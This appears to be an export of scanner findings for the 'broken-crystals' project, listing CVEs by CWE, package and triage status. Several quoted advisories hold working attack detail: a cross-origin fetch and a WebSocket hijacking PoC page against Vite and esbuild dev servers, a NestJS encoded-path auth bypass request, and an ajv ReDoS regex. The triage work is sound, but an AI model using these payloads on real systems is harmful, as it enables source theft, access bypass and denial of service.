GRP-broken-crystals-CWE-326-422,trivy,broken-crystals,CWE-326,low,gpgsm@2.2.12-1+deb10u2,gnupg2: OpenPGP Key Certification Forgeries with SHA-1,pending,low,no,1
GRP-broken-crystals-CWE-326-423,trivy,broken-crystals,CWE-326,low,gpgv@2.2.12-1+deb10u2,gnupg2: OpenPGP Key Certification Forgeries with SHA-1,pending,low,no,1
GRP-broken-crystals-CWE-327-424,trivy,broken-crystals,CWE-327,high,jsonwebtoken@8.5.1,jsonwebtoken: Unrestricted key type could lead to legacy keys usagen,TP,medium,yes,1
GRP-broken-crystals-CWE-330-425,npm-audit,broken-crystals,CWE-330,critical,form-data,form-data uses unsafe random function in form-data for choosing boundary,pending,low,no,1
GRP-broken-crystals-CWE-330-426,npm-audit,broken-crystals,CWE-330,info,undici,Use of Insufficiently Random Values in undici,pending,low,no,1
GRP-broken-crystals-CWE-330-427,dep-check,broken-crystals,CWE-330,critical,form-data:4.0.0,"### Summary form-data uses `Math.random()` to select a boundary value for multipart form-encoded data. This can lead to a security issue if an attacker: 1. can observe other values produced by Math.random in the target application, and 2. can control one field of a request made using form-data Because the values of Math.random() are pseudo-random and predictable (see: https://blog.securityevaluators.com/hacking-the-javascript-lottery-80cc437e3b7f), an attacker who can observe a few sequential values can determine the state of the PRNG and predict future values, includes those used to generate form-data's boundary value. The allows the attacker to craft a value that contains a boundary value, allowing them to inject additional parameters into the request. This is largely the same vulnerability as was [recently found in `undici`](https://hackerone.com/reports/2913312) by [`parrot409`](https://hackerone.com/parrot409?type=user) -- I'm not affiliated with that researcher but want to give credit where credit is due! My PoC is largely based on their work. ### Details The culprit is this line here: https://github.com/form-data/form-data/blob/426ba9ac440f95d1998dac9a5cd8d738043b048f/lib/form_data.js#L347 An attacker who is able to predict the output of Math.random() can predict this boundary value, and craft a payload that contains the boundary value, followed by another, fully attacker-controlled field. This is roughly equivalent to any sort of improper escaping vulnerability, with the caveat that the attacker must find a way to observe other Math.random() values generated by the application to solve for the state of the PRNG. However, Math.random() is used in all sorts of places that might be visible to an attacker (including by form-data itself, if the attacker can arrange for the vulnerable application to make a request to an attacker-controlled server using form-data, such as a user-controlled webhook -- the attacker could observe the boundary values from those requests to observe the Math.random() outputs). A common example would be a `x-request-id` header added by the server. These sorts of headers are often used for distributed tracing, to correlate errors across the frontend and backend. `Math.random()` is a fine place to get these sorts of IDs (in fact, [opentelemetry uses Math.random for this purpose](https://github.com/open-telemetry/opentelemetry-js/blob/2053f0d3a44631ade77ea04f656056a2c8a2ae76/packages/opentelemetry-sdk-trace-base/src/platform/node/RandomIdGenerator.ts#L22)) ### PoC PoC here: https://github.com/benweissmann/CVE-2025-7783-poc Instructions are in that repo. It's based on the PoC from https://hackerone.com/reports/2913312 but simplified somewhat; the vulnerable application has a more direct side-channel from which to observe Math.random() values (a separate endpoint that happens to include a randomly-generated request ID). ### Impact For an application to be vulnerable, it must: - Use `form-data` to send data including user-controlled data to some other system. The attacker must be able to do something malicious by adding extra parameters (that were not intended to be user-controlled) to this request. Depending on the target system's handling of repeated parameters, the attacker might be able to overwrite values in addition to appending values (some multipart form handlers deal with repeats by overwriting values instead of representing them as an array) - Reveal values of Math.random(). It's easiest if the attacker can observe multiple sequential values, but more complex math could recover the PRNG state to some degree of confidence with non-sequential values. If an application is vulnerable, this allows an attacker to make arbitrary requests to internal systems.",pending,low,no,1
GRP-broken-crystals-CWE-330-428,dep-check,broken-crystals,CWE-330,info,undici:5.28.4,"### Impact [Undici `fetch()` uses Math.random()](https://github.com/nodejs/undici/blob/8b06b8250907d92fead664b3368f1d2aa27c1f35/lib/web/fetch/body.js#L113) to choose the boundary for a multipart/form-data request. It is known that the output of Math.random() can be predicted if several of its generated values are known. If there is a mechanism in an app that sends multipart requests to an attacker-controlled website, they can use this to leak the necessary values. Therefore, An attacker can tamper with the requests going to the backend APIs if certain conditions are met. ### Patches This is fixed in 5.28.5; 6.21.1; 7.2.3. ### Workarounds Do not issue multipart requests to attacker controlled servers. ### References * https://hackerone.com/reports/2913312 * https://blog.securityevaluators.com/hacking-the-javascript-lottery-80cc437e3b7f",pending,low,no,1
GRP-broken-crystals-CWE-330-429,trivy,broken-crystals,CWE-330,critical,form-data@2.3.3,form-data: Unsafe random function in form-data,pending,low,no,1
GRP-broken-crystals-CWE-330-430,trivy,broken-crystals,CWE-330,critical,form-data@4.0.0,form-data: Unsafe random function in form-data,pending,low,no,1
GRP-broken-crystals-CWE-330-431,trivy,broken-crystals,CWE-330,medium,undici@5.21.0,undici: Undici Uses Insufficiently Random Values,pending,low,no,1
GRP-broken-crystals-CWE-331-432,trivy,broken-crystals,CWE-331,high,cpp-8@8.3.0-6,"gcc: POWER9 ""DARN"" RNG intrinsic produces repeated output",pending,low,no,1
GRP-broken-crystals-CWE-331-433,trivy,broken-crystals,CWE-331,high,g++-8@8.3.0-6,"gcc: POWER9 ""DARN"" RNG intrinsic produces repeated output",pending,low,no,1
GRP-broken-crystals-CWE-331-434,trivy,broken-crystals,CWE-331,high,gcc-8@8.3.0-6,"gcc: POWER9 ""DARN"" RNG intrinsic produces repeated output",pending,low,no,1
GRP-broken-crystals-CWE-331-435,trivy,broken-crystals,CWE-331,high,gcc-8-base@8.3.0-6,"gcc: POWER9 ""DARN"" RNG intrinsic produces repeated output",pending,low,no,1
GRP-broken-crystals-CWE-331-436,trivy,broken-crystals,CWE-331,high,libasan5@8.3.0-6,"gcc: POWER9 ""DARN"" RNG intrinsic produces repeated output",pending,low,no,1
GRP-broken-crystals-CWE-331-437,trivy,broken-crystals,CWE-331,high,libatomic1@8.3.0-6,"gcc: POWER9 ""DARN"" RNG intrinsic produces repeated output",pending,low,no,1
GRP-broken-crystals-CWE-331-438,trivy,broken-crystals,CWE-331,high,libcc1-0@8.3.0-6,"gcc: POWER9 ""DARN"" RNG intrinsic produces repeated output",pending,low,no,1
GRP-broken-crystals-CWE-331-439,trivy,broken-crystals,CWE-331,high,libgcc-8-dev@8.3.0-6,"gcc: POWER9 ""DARN"" RNG intrinsic produces repeated output",pending,low,no,1
GRP-broken-crystals-CWE-331-440,trivy,broken-crystals,CWE-331,high,libgcc1@1:8.3.0-6,"gcc: POWER9 ""DARN"" RNG intrinsic produces repeated output",pending,low,no,1
GRP-broken-crystals-CWE-331-441,trivy,broken-crystals,CWE-331,high,libgomp1@8.3.0-6,"gcc: POWER9 ""DARN"" RNG intrinsic produces repeated output",pending,low,no,1
GRP-broken-crystals-CWE-331-442,trivy,broken-crystals,CWE-331,high,libitm1@8.3.0-6,"gcc: POWER9 ""DARN"" RNG intrinsic produces repeated output",pending,low,no,1
GRP-broken-crystals-CWE-331-443,trivy,broken-crystals,CWE-331,high,liblsan0@8.3.0-6,"gcc: POWER9 ""DARN"" RNG intrinsic produces repeated output",pending,low,no,1
GRP-broken-crystals-CWE-331-444,trivy,broken-crystals,CWE-331,high,libmpx2@8.3.0-6,"gcc: POWER9 ""DARN"" RNG intrinsic produces repeated output",pending,low,no,1
GRP-broken-crystals-CWE-331-445,trivy,broken-crystals,CWE-331,high,libquadmath0@8.3.0-6,"gcc: POWER9 ""DARN"" RNG intrinsic produces repeated output",pending,low,no,1
GRP-broken-crystals-CWE-331-446,trivy,broken-crystals,CWE-331,high,libstdc++-8-dev@8.3.0-6,"gcc: POWER9 ""DARN"" RNG intrinsic produces repeated output",pending,low,no,1
GRP-broken-crystals-CWE-331-447,trivy,broken-crystals,CWE-331,high,libstdc++6@8.3.0-6,"gcc: POWER9 ""DARN"" RNG intrinsic produces repeated output",pending,low,no,1
GRP-broken-crystals-CWE-331-448,trivy,broken-crystals,CWE-331,high,libtsan0@8.3.0-6,"gcc: POWER9 ""DARN"" RNG intrinsic produces repeated output",pending,low,no,1
GRP-broken-crystals-CWE-331-449,trivy,broken-crystals,CWE-331,high,libubsan1@8.3.0-6,"gcc: POWER9 ""DARN"" RNG intrinsic produces repeated output",pending,low,no,1
GRP-broken-crystals-CWE-346-450,dep-check,broken-crystals,CWE-346,info,esbuild:0.21.5,"### Summary esbuild allows any websites to send any request to the development server and read the response due to default CORS settings. ### Details esbuild sets `Access-Control-Allow-Origin: *` header to all requests, including the SSE connection, which allows any websites to send any request to the development server and read the response. https://github.com/evanw/esbuild/blob/df815ac27b84f8b34374c9182a93c94718f8a630/pkg/api/serve_other.go#L121 https://github.com/evanw/esbuild/blob/df815ac27b84f8b34374c9182a93c94718f8a630/pkg/api/serve_other.go#L363 **Attack scenario**: 1. The attacker serves a malicious web page (`http://malicious.example.com`). 1. The user accesses the malicious web page. 1. The attacker sends a `fetch('http://127.0.0.1:8000/main.js')` request by JS in that malicious web page. This request is normally blocked by same-origin policy, but that's not the case for the reasons above. 1. The attacker gets the content of `http://127.0.0.1:8000/main.js`. In this scenario, I assumed that the attacker knows the URL of the bundle output file name. But the attacker can also get that information by - Fetching `/index.html`: normally you have a script tag here - Fetching `/assets`: it's common to have a `assets` directory when you have JS files and CSS files in a different directory and the directory listing feature tells the attacker the list of files - Connecting `/esbuild` SSE endpoint: the SSE endpoint sends the URL path of the changed files when the file is changed (`new EventSource('/esbuild').addEventListener('change', e => console.log(e.type, e.data))`) - Fetching URLs in the known file: once the attacker knows one file, the attacker can know the URLs imported from that file The scenario above fetches the compiled content, but if the victim has the source map option enabled, the attacker can also get the non-compiled content by fetching the source map file. ### PoC 1. Download [reproduction.zip](https://github.com/user-attachments/files/18561484/reproduction.zip) 2. Extract it and move to that directory 1. Run `npm i` 1. Run `npm run watch` 1. Run `fetch('http://127.0.0.1:8000/app.js').then(r => r.text()).then(content => console.log(content))` in a different website's dev tools. ![image](https://github.com/user-attachments/assets/08fc2e4d-e1ec-44ca-b0ea-78a73c3c40e9) ### Impact Users using the serve feature may get the source code stolen by malicious websites.",pending,low,no,1
GRP-broken-crystals-CWE-346-451,dep-check,broken-crystals,CWE-346,info,vite:5.4.10,"### Summary Vite allowed any websites to send any requests to the development server and read the response due to default CORS settings and lack of validation on the Origin header for WebSocket connections. > [!WARNING] > This vulnerability even applies to users that only run the Vite dev server on the local machine and does not expose the dev server to the network. ### Upgrade Path Users that does not match either of the following conditions should be able to upgrade to a newer version of Vite that fixes the vulnerability without any additional configuration. - Using the backend integration feature - Using a reverse proxy in front of Vite - Accessing the development server via a domain other than `localhost` or `*.localhost` - Using a plugin / framework that connects to the WebSocket server on their own from the browser #### Using the backend integration feature If you are using the backend integration feature and not setting [`server.origin`](https://vite.dev/config/server-options.html#server-origin), you need to add the origin of the backend server to the [`server.cors.origin`](https://github.com/expressjs/cors#configuration-options) option. Make sure to set a specific origin rather than `*`, otherwise any origin can access your development server. #### Using a reverse proxy in front of Vite If you are using a reverse proxy in front of Vite and sending requests to Vite with a hostname other than `localhost` or `*.localhost`, you need to add the hostname to the new [`server.allowedHosts`](https://vite.dev/config/server-options.html#server-allowedhosts) option. For example, if the reverse proxy is sending requests to `http://vite:5173`, you need to add `vite` to the `server.allowedHosts` option. #### Accessing the development server via a domain other than `localhost` or `*.localhost` You need to add the hostname to the new [`server.allowedHosts`](https://vite.dev/config/server-options.html#server-allowedhosts) option. For example, if you are accessing the development server via `http://foo.example.com:8080`, you need to add `foo.example.com` to the `server.allowedHosts` option. #### Using a plugin / framework that connects to the WebSocket server on their own from the browser If you are using a plugin / framework, try upgrading to a newer version of Vite that fixes the vulnerability. If the WebSocket connection appears not to be working, the plugin / framework may have a code that connects to the WebSocket server on their own from the browser. In that case, you can either: - fix the plugin / framework code to the make it compatible with the new version of Vite - set `legacy.skipWebSocketTokenCheck: true` to opt-out the fix for [2] while the plugin / framework is incompatible with the new version of Vite - When enabling this option, **make sure that you are aware of the security implications** described in the impact section of [2] above. ### Mitigation without upgrading Vite #### [1]: Permissive default CORS settings Set `server.cors` to `false` or limit `server.cors.origin` to trusted origins. #### [2]: Lack of validation on the Origin header for WebSocket connections There aren't any mitigations for this. #### [3]: Lack of validation on the Host header for HTTP requests Use Chrome 94+ or use HTTPS for the development server. ### Details There are three causes that allowed malicious websites to send any requests to the development server: #### [1]: Permissive default CORS settings Vite sets the [`Access-Control-Allow-Origin`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Access-Control-Allow-Origin) header depending on [`server.cors`](https://vite.dev/config/server-options.html#server-cors) option. The default value was `true` which sets `Access-Control-Allow-Origin: *`. This allows websites on any origin to `fetch` contents served on the development server. Attack scenario: 1. The attacker serves a malicious web page (`http://malicious.example.com`). 2. The user accesses the malicious web page. 3. The attacker sends a `fetch('http://127.0.0.1:5173/main.js')` request by JS in that malicious web page. This request is normally blocked by same-origin policy, but that's not the case for the reasons above. 4. The attacker gets the content of `http://127.0.0.1:5173/main.js`. #### [2]: Lack of validation on the Origin header for WebSocket connections Vite starts a WebSocket server to handle HMR and other functionalities. This WebSocket server [did not perform validation on the Origin header](https://github.com/vitejs/vite/blob/v6.0.7/packages/vite/src/node/server/ws.ts#L145-L157) and was vulnerable to Cross-Site WebSocket Hijacking (CSWSH) attacks. With that attack, an attacker can read and write messages on the WebSocket connection. Vite only sends some information over the WebSocket connection ([list of the file paths that changed, the file content where the errored happened, etc.](https://github.com/vitejs/vite/blob/v6.0.7/packages/vite/types/hmrPayload.d.ts#L12-L72)), but plugins can send arbitrary messages and may include more sensitive information. Attack scenario: 1. The attacker serves a malicious web page (`http://malicious.example.com`). 2. The user accesses the malicious web page. 3. The attacker runs `new WebSocket('http://127.0.0.1:5173', 'vite-hmr')` by JS in that malicious web page. 4. The user edits some files. 5. Vite sends some HMR messages over WebSocket. 6. The attacker gets the content of the HMR messages. #### [3]: Lack of validation on the Host header for HTTP requests Unless [`server.https`](https://vite.dev/config/server-options.html#server-https) is set, Vite starts the development server on HTTP. Non-HTTPS servers are vulnerable to DNS rebinding attacks without validation on the Host header. But Vite did not perform validation on the Host header. By exploiting this vulnerability, an attacker can send arbitrary requests to the development server bypassing the same-origin policy. 1. The attacker serves a malicious web page that is served on **HTTP** (`http://malicious.example.com:5173`) (HTTPS won't work). 2. The user accesses the malicious web page. 3. The attacker changes the DNS to point to 127.0.0.1 (or other private addresses). 4. The attacker sends a `fetch('/main.js')` request by JS in that malicious web page. 5. The attacker gets the content of `http://127.0.0.1:5173/main.js` bypassing the same origin policy. ### Impact #### [1]: Permissive default CORS settings Users with the default `server.cors` option may: - get the source code stolen by malicious websites - give the attacker access to functionalities that are not supposed to be exposed externally - Vite core does not have any functionality that causes changes somewhere else when receiving a request, but plugins may implement those functionalities and servers behind `server.proxy` may have those functionalities. #### [2]: Lack of validation on the Origin header for WebSocket connections All users may get the file paths of the files that changed and the file content where the error happened be stolen by malicious websites. For users that is using a plugin that sends messages over WebSocket, that content may be stolen by malicious websites. For users that is using a plugin that has a functionality that is triggered by messages over WebSocket, that functionality may be exploited by malicious websites. #### [3]: Lack of validation on the Host header for HTTP requests Users using HTTP for the development server and using a browser that is not Chrome 94+ may: - get the source code stolen by malicious websites - give the attacker access to functionalities that are not supposed to be exposed externally - Vite core does not have any functionality that causes changes somewhere else when receiving a request, but plugins may implement those functionalities and servers behind `server.proxy` may have those functionalities. Chrome 94+ users are not affected for [3], because [sending a request to a private network page from public non-HTTPS page is forbidden](https://developer.chrome.com/blog/private-network-access-update#chrome_94) since Chrome 94. ### Related Information Safari has [a bug that blocks requests to loopback addresses from HTTPS origins](https://bugs.webkit.org/show_bug.cgi?id=171934). This means when the user is using Safari and Vite is listening on lookback addresses, there's another condition of ""the malicious web page is served on HTTP"" to make [1] and [2] to work. ### PoC #### [2]: Lack of validation on the Origin header for WebSocket connections 1. I used the `react` template which utilizes HMR functionality. ``` npm create vite@latest my-vue-app-react -- --template react ``` 2. Then on a malicious server, serve the following POC html: ```html <!doctype html> <html lang=""en""> <head> <meta charset=""utf-8"" /> <title>vite CSWSH</title> </head> <body> <div id=""logs""></div> <script> const div = document.querySelectorAll('#logs')[0]; const ws = new WebSocket('ws://localhost:5173','vite-hmr'); ws.onmessage = event => { const logLine = document.createElement('p'); logLine.innerHTML = event.data; div.append(logLine); }; </script> </body> </html> ``` 3. Kick off Vite ``` npm run dev ``` 4. Load the development server (open `http://localhost:5173/`) as well as the malicious page in the browser. 5. Edit `src/App.jsx` file and intentionally place a syntax error 6. Notice how the malicious page can view the websocket messages and a snippet of the source code is exposed Here's a video demonstrating the POC: https://github.com/user-attachments/assets/a4ad05cd-0b34-461c-9ff6-d7c8663d6961",pending,low,no,1
GRP-broken-crystals-CWE-347-452,npm-audit,broken-crystals,CWE-347,high,jws,auth0/node-jws Improperly Verifies HMAC Signature,TP,medium,yes,1
GRP-broken-crystals-CWE-347-453,dep-check,broken-crystals,CWE-347,high,jws:3.2.2,"### Overview An improper signature verification vulnerability exists when using auth0/node-jws with the HS256 algorithm under specific conditions. ### Am I Affected? You are affected by this vulnerability if you meet all of the following preconditions: 1. Application uses the auth0/node-jws implementation of JSON Web Signatures, versions <=3.2.2 || 4.0.0 2. Application uses the jws.createVerify() function for HMAC algorithms 3. Application uses user-provided data from the JSON Web Signature Protected Header or Payload in the HMAC secret lookup routines You are NOT affected by this vulnerability if you meet any of the following preconditions: 1. Application uses the jws.verify() interface (note: `auth0/node-jsonwebtoken` users fall into this category and are therefore NOT affected by this vulnerability) 2. Application uses only asymmetric algorithms (e.g. RS256) 3. Application doesn’t use user-provided data from the JSON Web Signature Protected Header or Payload in the HMAC secret lookup routines ### Fix Upgrade auth0/node-jws version to version 3.2.3 or 4.0.1 ### Acknowledgement Okta would like to thank Félix Charette for discovering this vulnerability.",TP,medium,yes,1
GRP-broken-crystals-CWE-347-454,trivy,broken-crystals,CWE-347,high,libperl5.28@5.28.1-6+deb10u1,perl-CPAN: Bypass of verification of signatures in CHECKSUMS files,TP,medium,yes,1
GRP-broken-crystals-CWE-347-455,trivy,broken-crystals,CWE-347,high,perl@5.28.1-6+deb10u1,perl-CPAN: Bypass of verification of signatures in CHECKSUMS files,TP,medium,yes,1
GRP-broken-crystals-CWE-347-456,trivy,broken-crystals,CWE-347,high,perl-base@5.28.1-6+deb10u1,perl-CPAN: Bypass of verification of signatures in CHECKSUMS files,TP,medium,yes,1
GRP-broken-crystals-CWE-347-457,trivy,broken-crystals,CWE-347,high,perl-modules-5.28@5.28.1-6+deb10u1,perl-CPAN: Bypass of verification of signatures in CHECKSUMS files,TP,medium,yes,1
GRP-broken-crystals-CWE-347-458,trivy,broken-crystals,CWE-347,low,elliptic@6.5.4,elliptic: nodejs/elliptic: EDDSA signature malleability due to missing signature length check,TP,medium,yes,1
GRP-broken-crystals-CWE-347-459,trivy,broken-crystals,CWE-347,high,jws@3.2.2,node-jws: auth0/node-jws: Improper signature verification in HS256 algorithm,TP,medium,yes,1
GRP-broken-crystals-CWE-352-460,trivy,broken-crystals,CWE-352,medium,axios@0.21.4,axios: exposure of confidential data stored in cookies,TP,medium,yes,1
GRP-broken-crystals-CWE-352-461,trivy,broken-crystals,CWE-352,medium,axios@0.26.1,axios: exposure of confidential data stored in cookies,TP,medium,yes,1
GRP-broken-crystals-CWE-354-462,trivy,broken-crystals,CWE-354,medium,openssh-client@1:7.9p1-10+deb10u2,ssh: Prefix truncation attack on Binary Packet Protocol (BPP),pending,low,no,1
GRP-broken-crystals-CWE-362-463,trivy,broken-crystals,CWE-362,medium,libpython2.7-minimal@2.7.16-2+deb10u1,python: constant-time-defeating optimisations issue in the compare_digest function in Lib/hmac.p,pending,low,no,1
GRP-broken-crystals-CWE-362-464,trivy,broken-crystals,CWE-362,medium,libpython2.7-stdlib@2.7.16-2+deb10u1,python: constant-time-defeating optimisations issue in the compare_digest function in Lib/hmac.p,pending,low,no,1
GRP-broken-crystals-CWE-362-465,trivy,broken-crystals,CWE-362,medium,libpython3.7-minimal@3.7.3-2+deb10u4,python: constant-time-defeating optimisations issue in the compare_digest function in Lib/hmac.p,pending,low,no,1
GRP-broken-crystals-CWE-362-466,trivy,broken-crystals,CWE-362,medium,libpython3.7-stdlib@3.7.3-2+deb10u4,python: constant-time-defeating optimisations issue in the compare_digest function in Lib/hmac.p,pending,low,no,1
GRP-broken-crystals-CWE-362-467,trivy,broken-crystals,CWE-362,high,linux-libc-dev@4.19.269-1,kernel: saa7134: race condition leading to use-after-free in saa7134_finidev(),pending,low,no,1
GRP-broken-crystals-CWE-362-468,trivy,broken-crystals,CWE-362,medium,python2.7@2.7.16-2+deb10u1,python: constant-time-defeating optimisations issue in the compare_digest function in Lib/hmac.p,pending,low,no,1
GRP-broken-crystals-CWE-362-469,trivy,broken-crystals,CWE-362,medium,python2.7-minimal@2.7.16-2+deb10u1,python: constant-time-defeating optimisations issue in the compare_digest function in Lib/hmac.p,pending,low,no,1
GRP-broken-crystals-CWE-362-470,trivy,broken-crystals,CWE-362,medium,python3.7@3.7.3-2+deb10u4,python: constant-time-defeating optimisations issue in the compare_digest function in Lib/hmac.p,pending,low,no,1
GRP-broken-crystals-CWE-362-471,trivy,broken-crystals,CWE-362,medium,python3.7-minimal@3.7.3-2+deb10u4,python: constant-time-defeating optimisations issue in the compare_digest function in Lib/hmac.p,pending,low,no,1
GRP-broken-crystals-CWE-367-472,npm-audit,broken-crystals,CWE-367,high,@nestjs/platform-fastify,Nest has a Fastify URL Encoding Middleware Bypass (TOCTOU),pending,low,no,1
GRP-broken-crystals-CWE-367-473,dep-check,broken-crystals,CWE-367,info,@nestjs/platform-fastify:10.4.7,"A NestJS application is vulnerable if it meets all of the following criteria: 1. Platform: Uses `@nestjs/platform-fastify`. 2. Security Mechanism: Relies on `NestMiddleware` (via `MiddlewareConsumer`) for security checks (authentication, authorization, etc.), or through `app.use()` 3. Routing: Applies middleware to specific routes using string paths or controllers (e.g., `.forRoutes('admin')`). Example Vulnerable Config: ```ts // app.module.ts export class AppModule implements NestModule { configure(consumer: MiddlewareConsumer) { consumer .apply(AuthMiddleware) // Security check .forRoutes('admin'); // Vulnerable: Path-based restriction } } ``` Attack Vector: - Target Route: `/admin` - Middleware Path: `admin` - Attack Request: `GET /%61dmin` - Result: Middleware is skipped (no match on `%61dmin`), but controller for `/admin` is executed. Consequences: - Authentication Bypass: Unauthenticated users can access protected routes. - Authorization Bypass: Restricted administrative endpoints become accessible to lower-privileged users. - Input Validation Bypass: Middleware performing sanitization or validation can be skipped. ### Patches Patched in `@nestjs/platform-fastify@11.1.11` ### Resources Credit goes to Hacktron AI for reporting this issue.",pending,low,no,1
GRP-broken-crystals-CWE-367-474,trivy,broken-crystals,CWE-367,high,linux-libc-dev@4.19.269-1,kernel: DPT I2O controller TOCTOU information disclosure vulnerability,pending,low,no,1
GRP-broken-crystals-CWE-367-475,trivy,broken-crystals,CWE-367,medium,@nestjs/platform-fastify@9.3.9,nestjs: NestJS framework: Security bypass allows unauthorized access to protected routes,pending,low,no,1
GRP-broken-crystals-CWE-369-476,trivy,broken-crystals,CWE-369,high,imagemagick@8:6.9.10.23+dfsg-2.1+deb10u4,ImagemMagick: Division by zero in WaveImage() of MagickCore/visual-effects.c,pending,low,no,1
GRP-broken-crystals-CWE-369-477,trivy,broken-crystals,CWE-369,high,imagemagick-6-common@8:6.9.10.23+dfsg-2.1+deb10u4,ImagemMagick: Division by zero in WaveImage() of MagickCore/visual-effects.c,pending,low,no,1
GRP-broken-crystals-CWE-369-478,trivy,broken-crystals,CWE-369,high,imagemagick-6.q16@8:6.9.10.23+dfsg-2.1+deb10u4,ImagemMagick: Division by zero in WaveImage() of MagickCore/visual-effects.c,pending,low,no,1
GRP-broken-crystals-CWE-369-479,trivy,broken-crystals,CWE-369,medium,libdjvulibre-dev@3.5.27.1-10+deb10u1,An issue was discovered IW44Image.cpp in djvulibre 3.5.28 in allows at ...,pending,low,no,1
GRP-broken-crystals-CWE-369-480,trivy,broken-crystals,CWE-369,medium,libdjvulibre-text@3.5.27.1-10+deb10u1,An issue was discovered IW44Image.cpp in djvulibre 3.5.28 in allows at ...,pending,low,no,1
GRP-broken-crystals-CWE-369-481,trivy,broken-crystals,CWE-369,medium,libdjvulibre21@3.5.27.1-10+deb10u1,An issue was discovered IW44Image.cpp in djvulibre 3.5.28 in allows at ...,pending,low,no,1
GRP-broken-crystals-CWE-369-482,trivy,broken-crystals,CWE-369,medium,libheif1@1.3.2-2~deb10u1,A Segmentation fault caused by a floating point exception exists in li ...,pending,low,no,1
GRP-broken-crystals-CWE-369-483,trivy,broken-crystals,CWE-369,high,libmagickcore-6-arch-config@8:6.9.10.23+dfsg-2.1+deb10u4,ImagemMagick: Division by zero in WaveImage() of MagickCore/visual-effects.c,pending,low,no,1
GRP-broken-crystals-CWE-369-484,trivy,broken-crystals,CWE-369,high,libmagickcore-6-headers@8:6.9.10.23+dfsg-2.1+deb10u4,ImagemMagick: Division by zero in WaveImage() of MagickCore/visual-effects.c,pending,low,no,1
GRP-broken-crystals-CWE-369-485,trivy,broken-crystals,CWE-369,high,libmagickcore-6.q16-6@8:6.9.10.23+dfsg-2.1+deb10u4,ImagemMagick: Division by zero in WaveImage() of MagickCore/visual-effects.c,pending,low,no,1
GRP-broken-crystals-CWE-369-486,trivy,broken-crystals,CWE-369,high,libmagickcore-6.q16-6-extra@8:6.9.10.23+dfsg-2.1+deb10u4,ImagemMagick: Division by zero in WaveImage() of MagickCore/visual-effects.c,pending,low,no,1
GRP-broken-crystals-CWE-369-487,trivy,broken-crystals,CWE-369,high,libmagickcore-6.q16-dev@8:6.9.10.23+dfsg-2.1+deb10u4,ImagemMagick: Division by zero in WaveImage() of MagickCore/visual-effects.c,pending,low,no,1
GRP-broken-crystals-CWE-369-488,trivy,broken-crystals,CWE-369,high,libmagickcore-dev@8:6.9.10.23+dfsg-2.1+deb10u4,ImagemMagick: Division by zero in WaveImage() of MagickCore/visual-effects.c,pending,low,no,1
GRP-broken-crystals-CWE-369-489,trivy,broken-crystals,CWE-369,high,libmagickwand-6-headers@8:6.9.10.23+dfsg-2.1+deb10u4,ImagemMagick: Division by zero in WaveImage() of MagickCore/visual-effects.c,pending,low,no,1
GRP-broken-crystals-CWE-369-490,trivy,broken-crystals,CWE-369,high,libmagickwand-6.q16-6@8:6.9.10.23+dfsg-2.1+deb10u4,ImagemMagick: Division by zero in WaveImage() of MagickCore/visual-effects.c,pending,low,no,1
GRP-broken-crystals-CWE-369-491,trivy,broken-crystals,CWE-369,high,libmagickwand-6.q16-dev@8:6.9.10.23+dfsg-2.1+deb10u4,ImagemMagick: Division by zero in WaveImage() of MagickCore/visual-effects.c,pending,low,no,1
GRP-broken-crystals-CWE-369-492,trivy,broken-crystals,CWE-369,high,libmagickwand-dev@8:6.9.10.23+dfsg-2.1+deb10u4,ImagemMagick: Division by zero in WaveImage() of MagickCore/visual-effects.c,pending,low,no,1
GRP-broken-crystals-CWE-369-493,trivy,broken-crystals,CWE-369,medium,linux-libc-dev@4.19.269-1,kernel: fbdev: sis: Error out if pixclock equals zero,pending,low,no,1
GRP-broken-crystals-CWE-385-494,trivy,broken-crystals,CWE-385,high,libgnutls-dane0@3.6.7-4+deb10u10,gnutls: incomplete fix for CVE-2023-5981,pending,low,no,1
GRP-broken-crystals-CWE-385-495,trivy,broken-crystals,CWE-385,high,libgnutls-openssl27@3.6.7-4+deb10u10,gnutls: incomplete fix for CVE-2023-5981,pending,low,no,1
GRP-broken-crystals-CWE-385-496,trivy,broken-crystals,CWE-385,high,libgnutls28-dev@3.6.7-4+deb10u10,gnutls: incomplete fix for CVE-2023-5981,pending,low,no,1
GRP-broken-crystals-CWE-385-497,trivy,broken-crystals,CWE-385,high,libgnutls30@3.6.7-4+deb10u10,gnutls: incomplete fix for CVE-2023-5981,pending,low,no,1
GRP-broken-crystals-CWE-385-498,trivy,broken-crystals,CWE-385,high,libgnutlsxx28@3.6.7-4+deb10u10,gnutls: incomplete fix for CVE-2023-5981,pending,low,no,1
GRP-broken-crystals-CWE-399-499,trivy,broken-crystals,CWE-399,high,linux-libc-dev@4.19.269-1,kernel: memory exhaustion via crafted Graphics Execution Manager (GEM) objects,pending,low,no,1
GRP-broken-crystals-CWE-400-500,npm-audit,broken-crystals,CWE-400,info,ajv,ajv has ReDoS when using `$data` option,TP,medium,yes,1
GRP-broken-crystals-CWE-400-501,npm-audit,broken-crystals,CWE-400,low,brace-expansion,brace-expansion Regular Expression Denial of Service vulnerability,TP,medium,yes,1
GRP-broken-crystals-CWE-400-502,npm-audit,broken-crystals,CWE-400,low,diff,jsdiff has a Denial of Service vulnerability in parsePatch and applyPatch,TP,medium,yes,1
GRP-broken-crystals-CWE-400-503,dep-check,broken-crystals,CWE-400,info,ajv:6.12.6,"ajv (Another JSON Schema Validator) through version 8.17.1 is vulnerable to Regular Expression Denial of Service (ReDoS) when the `$data` option is enabled. The pattern keyword accepts runtime data via JSON Pointer syntax (`$data` reference), which is passed directly to the JavaScript `RegExp()` constructor without validation. An attacker can inject a malicious regex pattern (e.g., `\""^(a|a)*$\""`) combined with crafted input to cause catastrophic backtracking. A 31-character payload causes approximately 44 seconds of CPU blocking, with each additional character doubling execution time. This enables complete denial of service with a single HTTP request against any API using ajv with `$data`: true for dynamic schema validation.",TP,medium,yes,1
GRP-broken-crystals-CWE-400-504,dep-check,broken-crystals,CWE-400,info,ajv:8.17.1,"ajv (Another JSON Schema Validator) through version 8.17.1 is vulnerable to Regular Expression Denial of Service (ReDoS) when the `$data` option is enabled. The pattern keyword accepts runtime data via JSON Pointer syntax (`$data` reference), which is passed directly to the JavaScript `RegExp()` constructor without validation. An attacker can inject a malicious regex pattern (e.g., `\""^(a|a)*$\""`) combined with crafted input to cause catastrophic backtracking. A 31-character payload causes approximately 44 seconds of CPU blocking, with each additional character doubling execution time. This enables complete denial of service with a single HTTP request against any API using ajv with `$data`: true for dynamic schema validation.",TP,medium,yes,1
